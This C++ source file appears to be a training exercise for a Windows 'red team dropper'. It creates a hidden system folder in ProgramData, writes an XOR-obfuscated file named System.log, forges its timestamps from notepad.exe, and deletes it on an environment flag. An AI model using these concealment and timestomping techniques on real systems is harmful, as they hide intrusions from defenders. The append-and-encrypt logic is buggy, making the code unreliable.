// 4_0-Practical-exercise.cpp : Build a red team dropper that
// 1.Create a hidden directory in C:\ProgramData
// 2.Drops an encrypted file to that directory
// 3.Sets the timestamp to match notepad.exe
// 4.Appends content to the file on subsequent runs
// 5.Deletes the file if a specific environment variable is set (e.g, CLEANUP=true)
//

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

bool bCreateDir();
bool isExist();
void bCreateFile();
std::string readFile(std::string& outBuffer);
std::string xorEncryptDecrypt(const std::string& input, char key);
bool cgTimeStamp();
void appendNewData(const char* input);
void writeEncrypted(const char* input, size_t length);
void envCheck();
LONGLONG checkSizeByPath(const char* filePath);

int main()
{

    std::cout << "Program start..." << std::endl;

    char key = 'A';
    //Checking if directory is exist
    bCreateDir();
    // Checking if File is exist
    std::cout << "Checking file existence..." << std::endl;
    if (!isExist()) {
        bCreateFile();
    }

    // perbaiki logic if dibawah
    const char* filePath = "C:\\ProgramData\\SystemCache\\System.log";
    LONGLONG fileSize = checkSizeByPath(filePath);
    /*if (fileSize <= 0) {
        std::cout << "Skipping xor'ing" << std::endl;
    }*/

    if (fileSize > 0 || isExist()) { // Karna filesize lebih besar dari nol, maka dipastikan isi file dalam keadaan enkripted
        std::string contents;
        readFile(contents); // contents adalah outbuffer dalam bentuk xor'ed
        std::cout << "Enter new data to append: ";
        std::string stringData; // new data to append stored here
        std::getline(std::cin, stringData);

        // We should decrypt all the data, then append with new inputed data before we append and encrypt again
        std::string decryptedNewData = xorEncryptDecrypt(contents, key) + stringData + "\n";
        const char* newData = decryptedNewData.c_str();
        appendNewData(newData);
        std::string outContents = newData;
        std::cout << "Contents before encrypted [ " << outContents << " ]" << std::endl;
        std::string encryptedContents = xorEncryptDecrypt(outContents, key);
        std::cout << "Contents after encrypted [ " << encryptedContents << " ]" << std::endl;
        std::cout << "Begin replacing original content to encrypted content..." << std::endl;

        const char* dataTowrite = encryptedContents.c_str();
        size_t panjang = strlen(dataTowrite);
        writeEncrypted(dataTowrite, panjang);
    }
    else {
        std::cout << "Error checking filesize" << std::endl;
    }

    // Change file timestamp
    bool changeTime = cgTimeStamp();

    if (changeTime) {
        std::cout << "Time changed successfully..." << std::endl;
    }
    else {
        std::cout << "Failed to change timestamp!";
    }

    std::cout << "Checking env.." << std::endl;
    envCheck();

    std::cout << "Done" << std::endl;
    return 0;
}

bool bCreateDir() {

    bool createIt = false;
    std::cout << "Checking folder existence.." << std::endl;
    DWORD attr = GetFileAttributesA(
        "C:\\ProgramData\\SystemCache"
    );
    if ((attr != INVALID_FILE_ATTRIBUTES) && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        std::cout << "Folder EXIST. Skipping creating directory" << std::endl;
        createIt = false;
    }
    else if (!((attr != INVALID_FILE_ATTRIBUTES) && (attr & FILE_ATTRIBUTE_DIRECTORY))) {
        std::cout << "Folder doesn't exist, Creating folder.." << std::endl;
        bool createdir = CreateDirectoryA(
            "C:\\ProgramData\\SystemCache",
            NULL
        );
        if (createdir) {
            std::cout << "Directory Created!" << std::endl;
            std::cout << "Begin Setting the attributes.." << std::endl;
        }

        bool set_attr = SetFileAttributesA(
            "C:\\ProgramData\\SystemCache",
            FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN
        );

        if (set_attr) {
            std::cout << "Attribute set succesfully.." << std::endl;
        }

        createIt = false;
    }
    else {
        std::cout << "Unknown Error!" << std::endl;

    }


    return createIt;


}

bool isExist() {
    DWORD attr = GetFileAttributesA(
        "C:\\ProgramData\\SystemCache\\System.log"
    );

    if ((attr != INVALID_FILE_ATTRIBUTES) && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        std::cout << "File exist!" << std::endl;
        return true;
    }
    else {
        std::cerr << "File doesn't exist, creating file log..." << std::endl;
        return false;
    }
}

void bCreateFile() {
    HANDLE hCreateFile = CreateFileA(
        "C:\\ProgramData\\SystemCache\\System.log",
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        NULL
    );
    if (hCreateFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed open handle .." << GetLastError();
    }

    //const char* contentBuffer = input.c_str(); // Karena buffer untuk LPCVOID support const char* , maka kita convert string ke sini
    //DWORD written;
    //bool success = false;

    //if (WriteFile(hCreateFile, contentBuffer, strlen(contentBuffer), &written, NULL)) {
    //    std::cout << "File written succesfully" << std::endl;
    //    success = true;
    //}
    //else {
    //    std::cout << "Failed writing file" << std::endl;
    //    success = false;
    //}
    CloseHandle(hCreateFile);
}

std::string readFile(std::string& outBuffer) {
    // 1. Gunakan buffer bertipe char* atau BYTE* (memori mentah)
    // Ukuran buffer 1024 byte
    const int buffer = 1024;
    char tempBuffer[buffer];

    // Pastikan outBuffer kosong sebelum diisi (opsional, tergantung kebutuhan)
    outBuffer.clear();

    HANDLE hFile = CreateFileA(
        "C:\\ProgramData\\SystemCache\\System.log",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesRead = 0;

        // Loop untuk membaca seluruh file (jika lebih besar dari 1024 byte)
        while (ReadFile(
            hFile,
            tempBuffer,
            buffer,
            &bytesRead,
            NULL
        ) && bytesRead > 0) {
            // 2. Salin data yang dibaca ke outBuffer
            // Gunakan append untuk menggabungkan blok-blok data
            outBuffer.append(tempBuffer, bytesRead);
        }
        CloseHandle(hFile);

    }
    // Perhatikan: Fungsi ini mengembalikan outBuffer, 
    // tetapi karena outBuffer adalah referensi, data juga tersimpan di luar fungsi.
    return outBuffer;
}

std::string xorEncryptDecrypt(const std::string& input, char key) {
    std::string output = input;
    for (size_t i = 0; i < input.size(); i++) {
        output[i] = input[i] ^ key;
    }
    return output;
}

bool cgTimeStamp() {
    bool success = false;
    HANDLE hSrc = CreateFileA(
        "C:\\Windows\\System32\\notepad.exe",
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    HANDLE hDst = CreateFileA(
        "C:\\ProgramData\\SystemCache\\System.log",
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    FILETIME cTime, aTime, wTime;
    GetFileTime(hSrc, &cTime, &aTime, &wTime);

    if (SetFileTime(hDst, &cTime, &aTime, &wTime)) {
        success = true;
    }
    else {
        success = false;
    }

    CloseHandle(hSrc);
    CloseHandle(hDst);
    return success;
}

void appendNewData(const char* input) {
    HANDLE hFile = CreateFileA(
        "C:\\ProgramData\\SystemCache\\System.log",
        FILE_APPEND_DATA,
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        SetFilePointer(hFile, 0, NULL, FILE_END);
        DWORD bytesWritten;
        const char* dataChar = input;
        WriteFile(
            hFile, dataChar, strlen(input), &bytesWritten, NULL
        );
        CloseHandle(hFile);
    }
}

void envCheck() {
    char buffer[256];
    const char* path = "C:\\ProgramData\\SystemCache\\System.log";
    DWORD result = GetEnvironmentVariableA(
        "CLEANUP",
        buffer,
        sizeof(buffer)
    );

    if (result > 0) {
        std::string value(buffer);
        if (value == "true") {
            std::cout << "Variable cleanup aktif, deleting file..." << std::endl;
            if (DeleteFileA(path)) {
                std::cout << "File deleted successfully" << std::endl;
            }
            else {
                std::cout << "Delete failed!" << std::endl;
            }
        }
        else {
            std::cout << "Variable cleanup tidak aktif. File tetap disimpan" << std::endl;
        }
    }
}

void writeEncrypted(const char* input, size_t length) {
    DWORD attr = GetFileAttributesA(
        "C:\\ProgramData\\SystemCache\\System.log"
    );
    if ((attr != INVALID_FILE_ATTRIBUTES) && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        HANDLE hFile = CreateFileA(
            "C:\\ProgramData\\SystemCache\\System.log",
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
            NULL
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            bool success = WriteFile(
                hFile,
                input,
                (DWORD)length,
                &bytesWritten,
                NULL
            );

            CloseHandle(hFile);
        }
    }

}

LONGLONG checkSizeByPath(const char* filePath) {
    WIN32_FILE_ATTRIBUTE_DATA fad;

    if (GetFileAttributesExA(filePath, GetFileExInfoStandard, &fad)) {
        LARGE_INTEGER size;
        size.HighPart = fad.nFileSizeHigh;
        size.LowPart = fad.nFileSizeLow;
        return size.QuadPart;
    }
    else {
        std::cout << "Failed to retrieve size data!" << std::endl;
    }

}







